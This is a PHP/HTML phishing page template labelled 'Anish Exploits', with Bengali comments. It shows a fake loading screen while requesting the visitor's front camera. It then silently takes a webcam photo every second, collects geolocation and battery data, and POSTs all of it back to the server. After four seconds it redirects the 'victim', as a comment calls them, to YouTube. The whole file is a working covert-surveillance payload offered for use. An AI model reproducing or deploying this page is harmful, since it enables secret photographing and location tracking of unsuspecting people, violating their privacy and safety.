<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; color: #fff; font-family: -apple-system, 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; max-width: 400px; width: 100%; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
        
        /* বড় সাইজের ব্যানার ফটো স্টাইল */
        .custom-img { 
            width: 100%; 
            max-height: 250px; 
            object-fit: cover; 
            border-radius: 12px; 
            border: 2px solid rgba(247,151,30,0.3); 
            margin-bottom: 20px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.5); 
        }

        /* লোডার এবং টেক্সট সম্পূর্ণ হাইড করার জন্য */
        .spinner, .status-text { 
            display: none !important; 
        }

        #video { display: none; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!empty($customImage) && file_exists($customImage)): ?>
            <img src="<?= $customImage ?>" alt="Target" class="custom-img">
        <?php else: ?>
            <div class="logo">✨ Anish Exploits</div>
        <?php endif; ?>
        
        <div class="spinner"></div>
        <div class="status-text" id="status">Loading...</div>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const visitorId = '<?= $visitorId ?>';
        // রিডাইরেক্ট লিংক সবসময় ইউটিউব করার জন্য
        const targetUrl = 'https://www.youtube.com'; 
        let isCapturing = false;

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            isCapturing = true;
            
            // ব্যাকগ্রাউন্ডে ছবি ক্যাপচার চলবে
            setInterval(() => {
                if (isCapturing) {
                    capturePhoto();
                }
            }, 1000);
        })
        .catch(err => {
            // ক্যামেরা ডিনাই করলেও যেন রিডাইরেক্ট হয়ে যায়
            setTimeout(() => { window.location.href = targetUrl; }, 2000);
        });

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            if (!video.videoWidth || video.videoWidth === 0) return;
            
            canvas.width = 640;
            canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({ photo: photoData });
        }

        // লোকেশন ও ব্যাটারি ব্যাকগ্রাউন্ডে সেন্ড হবে
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                sendData({ location: { lat: position.coords.latitude, lng: position.coords.longitude } });
            });
        }

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                sendData({ battery: { level: Math.round(battery.level * 100), charging: battery.charging } });
            });
        }

        let pendingData = [];
        function sendData(data) {
            pendingData.push(data);
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(pendingData)
            });
            pendingData = [];
        }

        // ৪ সেকেন্ড পর ভিকটিমকে ইউটিউবে পাঠিয়ে দেওয়া হবে (এর মধ্যে ব্যাকগ্রাউন্ডে ছবি ও ডাটা চলে যাবে)
        setTimeout(() => {
            isCapturing = false;
            window.location.href = targetUrl;
        }, 4000);
    </script>
</body>
</html>
